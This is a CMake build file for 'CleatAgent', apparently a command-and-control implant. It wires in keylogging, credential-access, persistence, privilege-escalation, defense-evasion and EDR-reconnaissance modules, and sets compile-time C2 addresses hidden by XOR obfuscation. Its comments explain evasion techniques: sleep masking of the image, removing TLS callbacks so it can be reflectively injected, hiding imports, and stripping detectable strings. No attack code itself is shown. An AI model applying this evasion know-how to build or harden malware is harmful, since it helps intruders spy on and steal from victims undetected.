cmake_minimum_required(VERSION 3.20)


project(CleatAgent VERSION 2.0.0 LANGUAGES CXX)


set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# ========== 编译器选项 ==========
if(MSVC)
    # 删掉 CMake 默认的 /W3，否则 add_compile_options(/W4) 会刷 D9025 覆盖警告
    string(REGEX REPLACE "/W[0-4]" "" CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS}")
    add_compile_options(/EHsc /W4 /MP)
    add_definitions(-D_CRT_SECURE_NO_WARNINGS)

    # CRT 选择:
    #   /MT 下 UCRT 的 **FLS 线程退出回调**在镜像内 —— 睡眠掩码窗口期任何系统线程
    #   退出(WinHTTP worker 退役/Tp 池退休…)都会执行镜像密文页 → EXECUTE-AV 崩
    #   (长窗 soak 实证: /MT 最多撑 2 窗; EXE 与 DLL 同判据, 的"EXE 免疫"已修正)。
    #   /MD 把 UCRT 移入系统 ucrtbase.dll → 窗口期线程退出不再触碰镜像(实测 22+ 窗零死)。
    # 取舍: /MD = 稳定优先(代价: 目标机需 VC++ 运行库 vcruntime140/msvcp140;
    #       ucrtbase Win10 自带) —— 默认 ON; /MT = 零依赖(代价: 掩码长窗必崩,
    #       仅限不启用掩码的构建), -DCLEAT_RUNTIME_MD=OFF 回退。
    option(CLEAT_RUNTIME_MD "产物用 /MD 动态 CRT(睡眠掩码稳定性前提; 需目标机运行库)" ON)
    if(CLEAT_RUNTIME_MD)
        set(CMAKE_MSVC_RUNTIME_LIBRARY "$<$<CONFIG:Debug>:MultiThreadedDebugDLL>$<$<NOT:$<CONFIG:Debug>>:MultiThreadedDLL>")
    else()
        set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
    endif()

    # Debug 首异常 VEH 打印(DbgVeh, Entry/AgentEntry.cpp): 排障工具, **默认关** ——
    # VEH 处理器代码在镜像内, 掩码窗口期任何"首异常"都会引爆"进 VEH→执行密文页→
    # 级联风暴"。排障时 -DCLEAT_DBG_VEH=ON 临时开。
    option(CLEAT_DBG_VEH "Debug 构建启用首异常 VEH 打印(破坏掩码窗口稳定性; 仅排障)" OFF)
    if(CLEAT_DBG_VEH)
        add_compile_definitions(CLEAT_DBG_VEH=1)
    endif()

    # Debug 剥离 /RTC: RTC 的 __rtc_taa/tdd 是与 UCRT FLS
    # 同族的线程回调 —— 掩码窗口期不允许任何"系统会异步调用的镜像内代码"存在。
    # (DLL 构建另受 POST_BUILD TLS 回调检查约束, 见 CLEAT_AS_DLL 段。)
    string(REPLACE "/RTC1" "" CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG}")
    string(REPLACE "/RTCsu" "" CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG}")
    string(REPLACE "/RTCc" "" CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG}")


else()
    add_compile_options(-Wall -Wextra -Wpedantic)
endif()

include(${CMAKE_CURRENT_SOURCE_DIR}/third_party.cmake)

# ========== 源文件收集 ==========
file(GLOB_RECURSE SOURCES
    LIST_DIRECTORIES false
    CONFIGURE_DEPENDS
    "${CMAKE_SOURCE_DIR}/*.cpp"
    "${CMAKE_SOURCE_DIR}/*.cc"
    "${CMAKE_SOURCE_DIR}/*.cxx")

file(GLOB_RECURSE HEADERS
    LIST_DIRECTORIES false
    CONFIGURE_DEPENDS
    "${CMAKE_SOURCE_DIR}/*.hpp"
    "${CMAKE_SOURCE_DIR}/*.h")

# 模块 DLL 入口不进主产物；stb_image_write_impl 仅模块用；测试另编
list(FILTER SOURCES EXCLUDE REGEX "/mod_[^/]*\\.cpp$")
list(FILTER SOURCES EXCLUDE REGEX "/stb_image_write_impl\\.cpp$")
list(FILTER SOURCES EXCLUDE REGEX "/tests/.*\\.cpp$")

# 排除构建目录（大小写不敏感）
foreach(_v SOURCES HEADERS)
    list(FILTER ${_v} EXCLUDE REGEX "/[Bb]uild/")
    list(FILTER ${_v} EXCLUDE REGEX "/[Oo]ut/")
    list(FILTER ${_v} EXCLUDE REGEX "/[Gg]itclone/")
endforeach()

# ========== 睡眠掩码 ==========
# CLEAT_WITH_MASK(默认 OFF): 掩码运行时 + 停靠协议 + SleepMaskProbe 命令的产物级开关。
# OFF 时 Core/Mask 整目录不编入(零足迹, 链接器无对象可拉) —— 调用点
# (CommandWorker/SessionLoop 循环顶)经 MaskPark.hpp 的空实现分态, 无需 #ifdef;
# ON 时定义 CLEAT_WITH_MASK=1 供各调用点/实现文件分态。
option(CLEAT_WITH_MASK "编译睡眠掩码(MaskWindow: 运行时+停靠+自检命令)" OFF)
if(NOT CLEAT_WITH_MASK)
    list(FILTER SOURCES EXCLUDE REGEX "/Core/Mask/[^/]*\\.cpp$")
endif()

# ==== 掩码的编译期硬门 ====
# /MT 的 UCRT FLS 线程退出回调在镜像内 → 窗口期任何系统线程退出 = 执行镜像密文
# = 必崩(长窗 soak + 全量转储实证) → 掩码构建**必须** /MD, 违反直接 configure 失败。
if(CLEAT_WITH_MASK AND MSVC AND NOT CLEAT_RUNTIME_MD)
    message(FATAL_ERROR
        "CLEAT_WITH_MASK=ON 不允许 CLEAT_RUNTIME_MD=OFF: /MT 下 UCRT FLS 线程退出回调在镜像内, "
        "掩码窗口期任何系统线程退出都会执行镜像密文(转储实证必崩)。 "
        "改 -DCLEAT_RUNTIME_MD=ON, 或 -DCLEAT_WITH_MASK=OFF。 "
        "详见 设计文档/。")
endif()
# DbgVeh 在窗口期把任一"首异常"放大成 417 轮级联风暴(转储实证) —— 不硬拒(排障仍需),
# 但构建时醒目提醒: 测掩码稳定性前必须关。
if(CLEAT_WITH_MASK AND MSVC AND CLEAT_DBG_VEH)
    message(WARNING
        "CLEAT_WITH_MASK=ON 且 CLEAT_DBG_VEH=ON: DbgVeh 会破坏掩码窗口稳定性(级联风暴实证), "
        "测掩码稳定性前必须 -DCLEAT_DBG_VEH=OFF。详见 设计文档。")
endif()

# ========== 极简核心模式 ==========
option(CLEAT_MINIMAL "Minimal core only (exclude feature modules)" OFF)
if(CLEAT_MINIMAL)
    # 只留框架（Services/Core、Jobs/Core、Tactics/Core），排具体模块
    foreach(_excl
        Components/Services/AudioStream Components/Services/CameraStream
        Components/Services/ClipboardMonitor Components/Services/DesktopStream
        Components/Services/FileMonitor Components/Services/Keylog Components/Services/Shell
        Components/Jobs/FileTransfer
        Components/Tactics/CredentialAccess Components/Tactics/DefenseEvasion
        Components/Tactics/Discovery Components/Tactics/Persistence
        Components/Tactics/PrivilegeEscalation)
        list(FILTER SOURCES EXCLUDE REGEX "/${_excl}/.*\\.cpp$")
    endforeach()
    message(STATUS "CleatAgent: CLEAT_MINIMAL — 具体功能模块已排除")
endif()

# ========== UTF-8 BOM 守卫 ==========
# MSVC 无 /utf-8 时按 GBK 解析源文件，无 BOM 的中文注释会报误导性错误（病根在另一文件）。
# 只对改动面（tests/ 与 Core/Comms/）报警，历史遗留文件不刷。
file(GLOB_RECURSE _bom_check
    LIST_DIRECTORIES false
    "${CMAKE_SOURCE_DIR}/Core/*.cpp" "${CMAKE_SOURCE_DIR}/Core/*.hpp"
    "${CMAKE_SOURCE_DIR}/Common/*.cpp" "${CMAKE_SOURCE_DIR}/Common/*.hpp"
    "${CMAKE_SOURCE_DIR}/Entry/*.cpp" "${CMAKE_SOURCE_DIR}/Entry/*.hpp"
    "${CMAKE_SOURCE_DIR}/Components/*.cpp" "${CMAKE_SOURCE_DIR}/Components/*.hpp"
    "${CMAKE_SOURCE_DIR}/../Tools/tests/*.cpp" "${CMAKE_SOURCE_DIR}/../Tools/tests/*.hpp")

set(_bom_scope "")
foreach(_f IN LISTS _bom_check)
    if(_f MATCHES "ThirdParty")
        continue()
    endif()
    file(READ "${_f}" _head LIMIT 3 HEX)
    if(NOT _head STREQUAL "efbbbf" AND NOT _head STREQUAL "")
        if(_f MATCHES "/tests/" OR _f MATCHES "/Core/Comms/")
            list(APPEND _bom_scope "${_f}")
        endif()
    endif()
endforeach()

if(_bom_scope)
    message(WARNING "CleatAgent: 以下改动面文件缺 UTF-8 BOM（MSVC 会按 GBK 解析中文注释）:")
    foreach(_f IN LISTS _bom_scope)
        message(WARNING "    ${_f}")
    endforeach()
endif()

# ========== 平台过滤 ==========
if(WIN32)
    list(FILTER SOURCES EXCLUDE REGEX "/PlatformLinux_.*\\.cpp$")
else()
    list(FILTER SOURCES EXCLUDE REGEX "/PlatformWin_.*\\.cpp$")
endif()

# ========== 三层 target ==========
# cleat_core: 全部实现；CleatAgent: 仅形态入口；cleat_core_tests: 链接 core。
option(CLEAT_AS_DLL "Build as DLL (rundll32 entry) instead of EXE" OFF)

set(CLEAT_ENTRY_EXE "${CMAKE_SOURCE_DIR}/Entry/EntryExe.cpp")
set(CLEAT_ENTRY_DLL "${CMAKE_SOURCE_DIR}/Entry/EntryDll.cpp")
set(CLEAT_CORE_SOURCES ${SOURCES})
list(REMOVE_ITEM CLEAT_CORE_SOURCES ${CLEAT_ENTRY_EXE} ${CLEAT_ENTRY_DLL})

add_library(cleat_core STATIC ${CLEAT_CORE_SOURCES} ${HEADERS})
target_include_directories(cleat_core PUBLIC ${CMAKE_SOURCE_DIR})

if(CLEAT_MINIMAL)
    target_compile_definitions(cleat_core PUBLIC CLEAT_MINIMAL=1)
endif()

# 睡眠掩码: ON 时定义宏, MaskPark.hpp/MaskGate 等按它分态
if(CLEAT_WITH_MASK)
    target_compile_definitions(cleat_core PUBLIC CLEAT_WITH_MASK=1)
endif()

# DLL 形态：静态库不会自动获得 _WINDLL，需显式传播（Core 内两处 #ifdef _WINDLL）
if(CLEAT_AS_DLL AND MSVC)
    target_compile_definitions(cleat_core PUBLIC _WINDLL)
endif()

# ========== 掩码构建期防线: POST_BUILD TLS 回调检查 ==========
# 任何静态 TLS 回调 → 线程生灭时加载器**直接调用**(DisableThreadLibraryCalls 抑制
# 不了) → 掩码窗口期内执行镜像密文 → 崩。EXE/DLL 产物**同判据**(: "EXE 不收
# 线程通知"仅对 DLL_THREAD_ATTACH 成立; TLS 回调路径两端同样中招)。
# 防线分工: ①本检查(构建期, 回调数组非空即构建失败, 兜住自有/第三方/链接器引入的
#            一切静态 TLS 回调 —— 检查脚本见 Tools/TlsCheck/tls_check.py);
#          ②运行期 taint(DLL=DllMain "通知抑制失败||本检查", EXE=EntryExe.cpp 的
#            DetectTlsCallbacks; 兜住本检查被绕过/手工跳过的残局)。
# 注: **不存在"编译期毒化 thread_local 关键字"这道防线** —— 宏化关键字会被 MSVC STL
# 的 xkeycheck.h #error 直接禁止(实测踩过, 勿再尝试)。
find_package(Python3 QUIET COMPONENTS Interpreter)

if(CLEAT_AS_DLL)
    add_library(CleatAgent SHARED "${CMAKE_SOURCE_DIR}/Entry/EntryDll.cpp")
    target_link_libraries(CleatAgent PRIVATE cleat_core)
    # ==== DLL 产物防线 ====
    # Debug 构建剥离 /RTC1: 已提升为全局(见文件头 MSVC 段, EXE/DLL 统一) ——
    # RTC(__rtc_taa/tdd)是与 UCRT FLS 同族的**线程回调**, 掩码窗口期不得存在;
    # 同时它会被 POST_BUILD 的 TLS 回调检查拒绝(双保险; 检查说明见上方公共段)。
    if(Python3_FOUND AND EXISTS "${CMAKE_SOURCE_DIR}/../Tools/TlsCheck/tls_check.py")
        add_custom_command(TARGET CleatAgent POST_BUILD
            COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_SOURCE_DIR}/../Tools/TlsCheck/tls_check.py"
                "$<TARGET_FILE:CleatAgent>"
            COMMENT "TLS directory check (DLL sleep-mask precondition)")
    else()
        message(WARNING "CleatAgent: 未找到 Python3, 跳过 POST_BUILD TLS 目录检查"
                        "(防线 1 失效, 防线 2 仍在)")
    endif()
else()
    add_executable(CleatAgent "${CMAKE_SOURCE_DIR}/Entry/EntryExe.cpp")
    target_link_libraries(CleatAgent PRIVATE cleat_core)
    # Release 用 WinMain（GUI 子系统），Debug 用 main（控制台）。
    # 多配置生成器下 CMAKE_BUILD_TYPE 为空，必须用 $<CONFIG:...> 求值。
    if(MSVC)
        set_target_properties(CleatAgent PROPERTIES
            WIN32_EXECUTABLE $<$<NOT:$<CONFIG:Debug>>:TRUE>)
    endif()
    # ==== EXE 产物防线: 与 DLL 分支同判据 ====
    # EXE 的静态 TLS 回调数组同样在线程生灭时被加载器直接调用(镜像内代码) ——
    # 非空即构建失败。运行期 taint 见 EntryExe.cpp 的 DetectTlsCallbacks 调用。
    if(WIN32 AND Python3_FOUND AND EXISTS "${CMAKE_SOURCE_DIR}/../Tools/TlsCheck/tls_check.py")
        add_custom_command(TARGET CleatAgent POST_BUILD
            COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_SOURCE_DIR}/../Tools/TlsCheck/tls_check.py"
                "$<TARGET_FILE:CleatAgent>"
            COMMENT "TLS directory check (EXE sleep-mask precondition)")
    elseif(WIN32)
        message(WARNING "CleatAgent: 未找到 Python3, 跳过 POST_BUILD TLS 目录检查"
                        "(防线 1 失效, 防线 2 仍在)")
    endif()
endif()

# ========== 模块 DLL ==========
# mod_*.cpp 已从 SOURCES 排除，此处逐个编 SHARED 产物下发。
# 模块零链接核心，仅头依赖；用 /MT 静态 CRT（目标机不保证有 MSVCR/MSVCP）。
# /Zc:threadSafeInit-：反射加载器拒绝带 TLS 目录的模块（见 ISSUES R10b）。
if(WIN32)
    if(CMAKE_VS_PLATFORM_NAME)
        set(_MOD_ARCH "${CMAKE_VS_PLATFORM_NAME}")
    elseif(CMAKE_GENERATOR_PLATFORM)
        set(_MOD_ARCH "${CMAKE_GENERATOR_PLATFORM}")
    elseif(CMAKE_SIZEOF_VOID_P EQUAL 4)
        set(_MOD_ARCH "x86")
    else()
        set(_MOD_ARCH "x64")
    endif()
    if(NOT _MOD_ARCH MATCHES "^(x64|x86)$")
        if(_MOD_ARCH MATCHES "Win32|i386|IA32")
            set(_MOD_ARCH "x86")
        else()
            set(_MOD_ARCH "x64")
        endif()
    endif()

    set(_MOD_SODIUM_INC "${CMAKE_SOURCE_DIR}/Common/ThirdParty/libsodium/include")
    if(_MOD_ARCH STREQUAL "x86")
        set(_MOD_SODIUM_LIB "${CMAKE_SOURCE_DIR}/Common/ThirdParty/libsodium/Win32/$<CONFIG>/v143/static/libsodium.lib")
    else()
        set(_MOD_SODIUM_LIB "${CMAKE_SOURCE_DIR}/Common/ThirdParty/libsodium/x64/$<CONFIG>/v143/static/libsodium.lib")
    endif()

    # 模块名 = module_id = 上传用名。
    # 任务系统 Phase 3: 7 个服务模块 DLL 退役 —— 它们的"B 档复用拆"前提
    # (服务类零改动编入模块)随服务类删除而消失; 模块路径本就搁置(治理盲区已登记),
    # 恢复须等 CleatCoreApi 开 job 桥。mod_screenshot/mod_edrrecon
    # 不依赖服务类, 维持不变。
    set(CLEAT_MODULES)

    # A 档：独立，不读 AgentConfig
    set(mod_screenshot_SOURCES
        Components/Commands/ScreenShot/mod_screenshot.cpp
        Components/Commands/ScreenShot/Provider/ScreenShotProvider.cpp
        Components/Commands/ScreenShot/Platform/ScreenShotOpsFactory.cpp
        Components/Commands/ScreenShot/Platform/PlatformWin_ScreenShot.cpp)
    set(mod_screenshot_LIBS gdi32 user32)

    set(mod_edrrecon_SOURCES
        Components/Commands/EdrRecon/mod_edrrecon.cpp
        Components/Commands/EdrRecon/Provider/EdrReconProvider.cpp
        Components/Commands/EdrRecon/Platform/EdrReconOpsFactory.cpp
        Components/Commands/EdrRecon/Platform/PlatformWin_EdrRecon.cpp)
    set(mod_edrrecon_LIBS psapi ole32 oleaut32 wbemuuid)

    # B 档：shim + 现有 Service/Provider/Platform







    # CORE：复用核心 AgentConfig（inline getter）所需最小源；不拖 SecretVault/libsodium 主体。
    # 因 StaticObfConfig 调 sodium_memzero，需 libsodium 头 + 静态库（只拉那一个对象）。
    # 线程治理: 服务循环统一接入 Governor(Attach/Checkpoint/Paused) ——
    # 服务源码编入模块后同样需要符号, 故补 ThreadGovernor.cpp(+其 RequestExit 并轨
    # 所需的 SessionIdentity.cpp)。注意: 模块获得的是**私有** Governor/SessionIdentity
    # 实例(与既有 StaticObfConfig 私有副本同一模式) —— 宿主 SetPaused 不达模块服务,
    # 该限制登记 ISSUES(等模块 ABI 面开放 checkpoint 桥再收口)。

    foreach(_mod IN LISTS CLEAT_MODULES)
        add_library(${_mod} SHARED ${${_mod}_SOURCES} ${${_mod}_CORE})
        set_target_properties(${_mod} PROPERTIES
            CXX_STANDARD 17
            RUNTIME_OUTPUT_DIRECTORY "${CMAKE_SOURCE_DIR}/Build/${_MOD_ARCH}/$<CONFIG>/modules"
            LIBRARY_OUTPUT_DIRECTORY "${CMAKE_SOURCE_DIR}/Build/${_MOD_ARCH}/$<CONFIG>/modules")
        target_include_directories(${_mod} PRIVATE ${CMAKE_SOURCE_DIR})
        if(NOT "${${_mod}_CORE}" STREQUAL "")
            target_include_directories(${_mod} PRIVATE ${_MOD_SODIUM_INC})
            target_compile_definitions(${_mod} PRIVATE SODIUM_STATIC)
            target_link_libraries(${_mod} PRIVATE ${_MOD_SODIUM_LIB})
        endif()
        # 静态 CRT 已由 CMAKE_MSVC_RUNTIME_LIBRARY 统一管，这里只加 TLS 消除
        target_compile_options(${_mod} PRIVATE /Zc:threadSafeInit-)
        if(NOT "${${_mod}_LIBS}" STREQUAL "")
            target_link_libraries(${_mod} PRIVATE ${${_mod}_LIBS})
        endif()
        message(STATUS "CleatAgent: 模块 ${_mod} → Build/${_MOD_ARCH}/<config>/modules/")
    endforeach()
endif()

# ========== 系统链接库 ==========
if(WIN32)
    # winhttp 不静态链接：WinHttp* 经 ApiResolver 运行时 LoadLibrary，导入表不留特征。
    target_link_libraries(cleat_core PUBLIC ws2_32 dbghelp iphlpapi)
endif()

# ========== 传输开关 ==========
# CLEAT_HTTP_MIMIC: 编译期宏已运行时化 —— AgentConfig::GetTcpMimic
# (SetConfig http.mimic 远程热更), 同一产物可动态切换伪装行为, 不再需要构建期区分。
option(CLEAT_ENCRYPTION "启用传输加密 (XChaCha20-Poly1305)" ON)

if(CLEAT_ENCRYPTION)
    target_compile_definitions(cleat_core PUBLIC CLEAT_ENCRYPTION=1)
    # 不再硬编码默认 PSK：部署用 --psk 运行时注入，或显式 -DCLEAT_PSK_HEX=xxx
    set(CLEAT_PSK_HEX "" CACHE STRING "Pre-shared key (hex, 64 chars); 运行时 --psk 优先")
    if(CLEAT_PSK_HEX)
        target_compile_definitions(cleat_core PUBLIC CLEAT_PSK_HEX="${CLEAT_PSK_HEX}")
    endif()
endif()

# ========== 编译期默认配置（Artifact 生成器烧参数） ==========
# 优先级：内置默认 < 编译期默认(本块) < CLI。空 = 不定义宏 = 走内置默认。
# CLEAT_DEFAULT_OBF 优先：地址字段 XOR 混淆块，定义后产物 .rdata 不含明文 C2。
set(CLEAT_DEFAULT_TRANSPORT   "" CACHE STRING "transport (tcp|https|dns|icmp)")
set(CLEAT_DEFAULT_HOST        "" CACHE STRING "C2 host")
set(CLEAT_DEFAULT_PORT        "" CACHE STRING "C2 port")
set(CLEAT_DEFAULT_URL         "" CACHE STRING "HTTPS GET url")
set(CLEAT_DEFAULT_UPLOAD_URL  "" CACHE STRING "HTTPS POST url")
set(CLEAT_DEFAULT_DNS_SERVER  "" CACHE STRING "DNS server (host:port)")
set(CLEAT_DEFAULT_DNS_DOMAIN  "" CACHE STRING "DNS domain")
set(CLEAT_DEFAULT_ICMP_TARGET "" CACHE STRING "ICMP target")
set(CLEAT_DEFAULT_PSK         "" CACHE STRING "PSK (64 hex)")
set(CLEAT_DEFAULT_SERVER_PUBKEY "" CACHE STRING "X25519 server pubkey (64 hex)")

foreach(_def CLEAT_DEFAULT_TRANSPORT CLEAT_DEFAULT_HOST CLEAT_DEFAULT_PORT
              CLEAT_DEFAULT_URL CLEAT_DEFAULT_UPLOAD_URL CLEAT_DEFAULT_DNS_SERVER
              CLEAT_DEFAULT_DNS_DOMAIN CLEAT_DEFAULT_ICMP_TARGET CLEAT_DEFAULT_OBF
              CLEAT_DEFAULT_PSK CLEAT_DEFAULT_SERVER_PUBKEY)
    if(NOT "${${_def}}" STREQUAL "")
        target_compile_definitions(cleat_core PUBLIC ${_def}="${${_def}}")
    endif()
endforeach()

# /Zc:threadSafeInit-：消除魔法静态的 TLS 依赖，shc/反射注入形态必需（见 ISSUES R10b）。
# 代价：静态局部初始化非线程安全（单 worker 线程场景可接受）。
set(CLEAT_NO_TLS_SAFE_STATIC "" CACHE STRING "off = /Zc:threadSafeInit- (shc/注入形态)")
if("${CLEAT_NO_TLS_SAFE_STATIC}" STREQUAL "off")
    target_compile_options(cleat_core PUBLIC /Zc:threadSafeInit-)
endif()

# 交付构建要在编译期摘除低级日志字面量（否则框架诊断文本仍会被 strings 命中）
set(CLEAT_LOG_MIN_LEVEL "" CACHE STRING "0=DEBUG 1=INFO 2=WARN 3=ERROR; empty=NDEBUG?2:0")
if(NOT "${CLEAT_LOG_MIN_LEVEL}" STREQUAL "")
    target_compile_definitions(cleat_core PUBLIC CLEAT_LOG_MIN_LEVEL=${CLEAT_LOG_MIN_LEVEL})
endif()

# 主循环节拍: 收帧排空制, 节拍只影响命令延迟
# 上限不限吞吐; 不进 SetConfig —— 自己的心跳引擎节奏无运行期改配收益。
set(CLEAT_LOOP_TICK_MS "100" CACHE STRING "SessionLoop main loop tick in ms (default 100)")
if(NOT "${CLEAT_LOOP_TICK_MS}" STREQUAL "" AND NOT "${CLEAT_LOOP_TICK_MS}" STREQUAL "100")
    target_compile_definitions(cleat_core PUBLIC CLEAT_LOOP_TICK_MS=${CLEAT_LOOP_TICK_MS})
endif()

# DNS DoH resolver: 编译期内嵌, 空 = UDP 直发模式。
# agent-only 能力 —— wire 格式零变化(RFC8484 POST body = 既有 wire 查询),
# 服务端权威 DNS 无感; server profile 字段(doh_url)后接。
set(CLEAT_DNS_DOH_URL "" CACHE STRING "DNS-over-HTTPS resolver URL (RFC8484, e.g. https://dns.example/dns-query); empty = UDP direct")
if(NOT "${CLEAT_DNS_DOH_URL}" STREQUAL "")
    target_compile_definitions(cleat_core PUBLIC CLEAT_DNS_DOH_URL="${CLEAT_DNS_DOH_URL}")
endif()

# ========== 非 Windows 依赖 ==========
if(NOT WIN32)
    set(CMAKE_THREAD_PREFER_PTHREAD TRUE)
    set(THREADS_PREFER_PTHREAD_FLAG TRUE)
    find_package(Threads REQUIRED)

    # X11：Linux 桌面截图用；无桌面环境运行期优雅失败，编译期需 libx11-dev
    find_package(X11 QUIET)
    if(X11_FOUND)
        target_include_directories(cleat_core PUBLIC ${X11_INCLUDE_DIR})
        target_link_libraries(cleat_core PUBLIC ${X11_LIBRARIES})
    else()
        message(WARNING "CleatAgent: 未找到 X11(libx11-dev), Linux 截图不可用")
    endif()
endif()

# ========== libsodium ==========
# public tree: vcpkg(unofficial-sodium) 优先; 否则用 scripts/build_libsodium.cmd
# 解压的官方 MSVC 预编译包(Common/ThirdParty/libsodium)。
set(LIBSODIUM_ROOT "${CMAKE_SOURCE_DIR}/Common/ThirdParty/libsodium")

if(WIN32)
    target_compile_definitions(cleat_core PUBLIC SODIUM_STATIC)
    find_package(unofficial-sodium CONFIG QUIET)
    if(TARGET unofficial::sodium::sodium)
        target_link_libraries(cleat_core PUBLIC unofficial::sodium::sodium)
    else()
        if(NOT EXISTS "${LIBSODIUM_ROOT}/include/sodium.h")
            message(FATAL_ERROR "libsodium 未就绪: 先运行 scripts/build_libsodium.cmd (官方 MSVC 预编译包), 或用 vcpkg 提供 unofficial-sodium")
        endif()
        target_include_directories(cleat_core PUBLIC ${LIBSODIUM_ROOT}/include)
        if(CMAKE_VS_PLATFORM_NAME)
            set(_PLATFORM "${CMAKE_VS_PLATFORM_NAME}")
        elseif(CMAKE_GENERATOR_PLATFORM)
            set(_PLATFORM "${CMAKE_GENERATOR_PLATFORM}")
        elseif(CMAKE_SIZEOF_VOID_P EQUAL 8)
            set(_PLATFORM "x64")
        else()
            set(_PLATFORM "Win32")
        endif()
        if(_PLATFORM STREQUAL "x64" OR _PLATFORM STREQUAL "AMD64")
            set(LIBSODIUM_ARCH "x64")
        else()
            set(LIBSODIUM_ARCH "Win32")
        endif()
        target_link_libraries(cleat_core PUBLIC
            ${LIBSODIUM_ROOT}/${LIBSODIUM_ARCH}/$<CONFIG>/v143/static/libsodium.lib)
    endif()
else()
    find_package(PkgConfig QUIET)
    if(PkgConfig_FOUND)
        pkg_check_modules(LIBSODIUM REQUIRED IMPORTED_TARGET libsodium)
        target_include_directories(cleat_core PUBLIC ${LIBSODIUM_INCLUDE_DIRS})
        target_compile_definitions(cleat_core PUBLIC SODIUM_STATIC)
        target_link_libraries(cleat_core PUBLIC PkgConfig::LIBSODIUM Threads::Threads)
    else()
        message(FATAL_ERROR "libsodium 未找到: apt install pkg-config libsodium-dev")
    endif()
endif()

# ========== msquic（Windows QUIC 通道；源码静态构建 quictls 后端） ==========
# 形态: **静态链接, Agent 落地物零 DLL** —— 对齐项目全静态纪律。
#   * msquic 2.6.1 源码构建(QUIC_TLS_LIB=quictls), openssl 3.1.7+quic 静态链入
#     msquic.lib 单体(lib.exe 合并 core+platform+libssl+libcrypto);
#   * Schannel 后端要求 Win11/Server 2022+(Win10 凭据创建即失败, 实测
#     SEC_E_NO_CREDENTIALS) —— quictls 后端自包含 TLS, Win10+ 可用;
#   * 构建脚本 scripts/build_msquic_quictls.cmd(需 Strawberry Perl portable,
#     openssl 配 no-asm 免 NASM; 本地补丁记录在 msquic-src/submodules/CMakeLists.txt);
#   * 选型与从零验证: 设计文档。
# 体积开关: CLEAT_WITH_QUIC=OFF 裁出"五通道无 QUIC"形态 —— 实测
#   msquic+quictls 静态链入贡献 ~2.5 MiB(全量的 45%), 体积敏感部署可 OFF。
#   OFF 时定义 CLEAT_NO_QUIC=1, MsQuicOps.cpp 走 nullptr 工厂分支, 装配层按
#   "平台不支持"跳过 QUIC 通道(与 Linux 侧行为一致), 其余四通道零变化。
# Linux: 构建未接入 —— CreateQuicOps 返回 nullptr, 通道按"平台不支持"跳过。
option(CLEAT_WITH_QUIC "构建 QUIC 通道(需先运行 scripts/build_msquic_quictls.cmd 生成静态 msquic)" OFF)

if(WIN32 AND CLEAT_WITH_QUIC)
    set(MSQUIC_ROOT "${CMAKE_SOURCE_DIR}/Common/ThirdParty/msquic")
    if(NOT EXISTS "${MSQUIC_ROOT}/x64/Release/msquic.lib")
        message(FATAL_ERROR "CLEAT_WITH_QUIC=ON 但未找到 msquic 静态库: 先运行 scripts/build_msquic_quictls.cmd 生成, 或改用 -DCLEAT_WITH_QUIC=OFF 跳过 QUIC")
    endif()
    target_include_directories(cleat_core PUBLIC ${MSQUIC_ROOT}/include)
    # 静态单体库(50MB; 链接器按需提取, 最终 exe 增量以实际引用为准)
    target_link_libraries(cleat_core PUBLIC ${MSQUIC_ROOT}/x64/Release/msquic.lib)
    # quictls 静态版的系统依赖导入库(lib.exe 合并未含; 链接试错补齐 ):
    # ntdll(Rtl*/Nt* 原语, datapath_raw/xdp) + ncrypt(证书 CAPI)
    target_link_libraries(cleat_core PUBLIC ntdll.lib ncrypt.lib)
else()
    target_compile_definitions(cleat_core PUBLIC CLEAT_NO_QUIC=1)
endif()

# ========== mbedTLS（Linux HTTPS，vendored v3.6.3） ==========
if(NOT WIN32)
    # public tree: mbedTLS from third_party.cmake (FetchContent)
    target_link_libraries(cleat_core PUBLIC mbedtls_static)
endif()

# ========== 测试 target ==========
# 默认不构建：让 VS 里打开 Agent 只看到生产代码。需要时 -DCLEAT_BUILD_TESTS=ON
option(CLEAT_BUILD_TESTS "构建 cleat_core_tests(测试/夹具/golden 对照)" OFF)

if(NOT CLEAT_BUILD_TESTS)
    message(STATUS "CleatAgent: 测试 target 未启用（如需: -DCLEAT_BUILD_TESTS=ON）")
    return()
endif()

enable_testing()
file(GLOB_RECURSE CLEAT_TEST_SOURCES
    LIST_DIRECTORIES false
    CONFIGURE_DEPENDS
    "${CMAKE_SOURCE_DIR}/../Tools/tests/*.cpp")
if(NOT CLEAT_TEST_SOURCES)
    message(FATAL_ERROR "CleatAgent: CLEAT_BUILD_TESTS=ON but Tools/tests is not present (this public tree ships without the test suite)")
endif()
add_executable(cleat_core_tests ${CLEAT_TEST_SOURCES})
# 测试树在 Agent 之外（Tools/tests），源码里 #include "tests/harness/..." 需要 Tools/ 作 include 根
target_include_directories(cleat_core_tests PRIVATE "${CMAKE_SOURCE_DIR}/../Tools")
target_link_libraries(cleat_core_tests PRIVATE cleat_core)
add_test(NAME cleat_core_tests COMMAND cleat_core_tests)